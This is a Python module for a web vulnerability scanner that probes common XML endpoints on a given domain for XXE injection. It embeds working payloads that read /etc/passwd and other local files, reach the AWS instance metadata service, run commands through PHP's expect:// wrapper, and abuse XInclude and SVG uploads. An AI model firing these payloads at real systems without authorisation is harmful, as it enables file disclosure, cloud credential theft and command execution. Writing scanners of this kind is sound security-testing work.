"""XXE — XML External Entity injection scanner.

XXE allows attackers to interfere with XML processing to read local files,
perform SSRF, or execute DoS (Billion Laughs). Affects any application
that parses XML input including SOAP APIs, SVG uploads, DOCX processors.

Tests: classic external entity, blind XXE via OOB, parameter entities,
       XInclude, SVG XXE, and DOCTYPE injection.
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlparse

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# XXE payloads — detect via file content reflection or error messages
_XXE_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload, detection_pattern, technique)
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        r"root:x:0:0:|daemon:|bin:|sys:",
        "classic_file_read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        r"127\.0\.0\.1\s+localhost",
        "hosts_file_read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        r"\[fonts\]|for 16-bit app",
        "windows_file_read",
    ),
    # SSRF via XXE
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        r"ami-id|instance-id|iam",
        "ssrf_aws_metadata",
    ),
    # PHP expect wrapper
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
        r"uid=\d+|gid=\d+",
        "php_expect_rce",
    ),
    # XInclude
    (
        '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
        r"root:x:0:0:",
        "xinclude",
    ),
    # Error-based XXE detection (triggers XML parser error with file content)
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',
        r"root:x:0:0:|xml|entity|parser",
        "error_based",
    ),
]

# XXE via SVG upload
_SVG_XXE = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>'''

# Common XML-accepting endpoints
_XML_ENDPOINTS: list[tuple[str, str]] = [
    ("/api", "application/xml"),
    ("/api/v1", "application/xml"),
    ("/soap", "text/xml"),
    ("/xmlrpc", "text/xml"),
    ("/xmlrpc.php", "text/xml"),
    ("/rss", "application/xml"),
    ("/feed", "application/xml"),
    ("/sitemap.xml", "application/xml"),
    ("/upload", "multipart/form-data"),
    ("/import", "application/xml"),
    ("/process", "application/xml"),
]

# Error messages indicating XML processing
_XML_INDICATORS = re.compile(
    r"(?i)(xml|entity|doctype|parse|sax|dom|xpath|xslt|namespace|encoding)",
)


class XXEScanner(BaseOsintScanner):
    """XML External Entity (XXE) injection vulnerability scanner.

    Tests XML-accepting endpoints for XXE vulnerabilities including:
    - Classic file read (file:///etc/passwd)
    - SSRF via external entity (cloud metadata)
    - XInclude attacks
    - SVG-based XXE via upload endpoints
    - Error-based blind XXE
    """

    scanner_name = "xxe"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 1800
    scan_timeout = 90

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        xml_endpoints_found: list[str] = []
        identifiers: list[str] = []

        async with httpx.AsyncClient(
            timeout=10,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; XXEScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(6)

            # Step 1: Find XML-accepting endpoints
            async def check_endpoint(path: str, content_type: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        # Probe with minimal XML
                        resp = await client.post(
                            url,
                            content=b"<?xml version='1.0'?><test/>",
                            headers={"Content-Type": content_type},
                        )
                        # If server responds to XML (not 404/405) or shows XML errors
                        if resp.status_code not in (404, 405, 501):
                            if _XML_INDICATORS.search(resp.text) or "xml" in resp.headers.get("content-type", "").lower():
                                xml_endpoints_found.append(url)
                        # Also check if endpoint exists at all
                        elif resp.status_code == 200:
                            xml_endpoints_found.append(url)
                    except Exception:
                        pass

            endpoint_tasks = [check_endpoint(path, ct) for path, ct in _XML_ENDPOINTS]
            await asyncio.gather(*endpoint_tasks)

            # Also test the base URL itself
            if base_url not in xml_endpoints_found:
                xml_endpoints_found.insert(0, base_url)

            # Step 2: Test XXE payloads against discovered endpoints
            async def test_xxe(target_url: str, payload: str, detection: str, technique: str) -> None:
                async with semaphore:
                    for ct in ["application/xml", "text/xml"]:
                        try:
                            resp = await client.post(
                                target_url,
                                content=payload.encode(),
                                headers={"Content-Type": ct},
                            )
                            if resp.status_code not in (404, 405) and re.search(detection, resp.text, re.I):
                                vuln = {
                                    "url": target_url,
                                    "technique": technique,
                                    "severity": "critical" if "rce" in technique or "passwd" in technique.lower() else "high",
                                    "evidence": re.search(detection, resp.text, re.I).group(0)[:80] if re.search(detection, resp.text, re.I) else "",
                                    "description": f"XXE {technique}: server returned sensitive file content",
                                }
                                vulnerabilities.append(vuln)
                                ident = f"vuln:xxe:{technique}"
                                if ident not in identifiers:
                                    identifiers.append(ident)
                                return
                        except Exception:
                            pass

            # Step 3: SVG upload test
            async def test_svg_upload(target_url: str) -> None:
                async with semaphore:
                    try:
                        resp = await client.post(
                            target_url,
                            files={"file": ("test.svg", _SVG_XXE.encode(), "image/svg+xml")},
                        )
                        if resp.status_code not in (404, 405) and re.search(r"root:x:0:0:", resp.text):
                            vulnerabilities.append({
                                "url": target_url,
                                "technique": "svg_upload",
                                "severity": "critical",
                                "description": "XXE via SVG upload — server parsed external entity",
                            })
                            identifiers.append("vuln:xxe:svg_upload")
                    except Exception:
                        pass

            xxe_tasks = []
            for endpoint in xml_endpoints_found[:5]:
                for payload, detection, technique in _XXE_PAYLOADS:
                    xxe_tasks.append(test_xxe(endpoint, payload, detection, technique))

            # SVG upload tests
            for upload_path in ["/upload", "/api/upload", "/import"]:
                xxe_tasks.append(test_svg_upload(base_url.rstrip("/") + upload_path))

            await asyncio.gather(*xxe_tasks)

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "xml_endpoints_probed": xml_endpoints_found,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "is_vulnerable": len(vulnerabilities) > 0,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
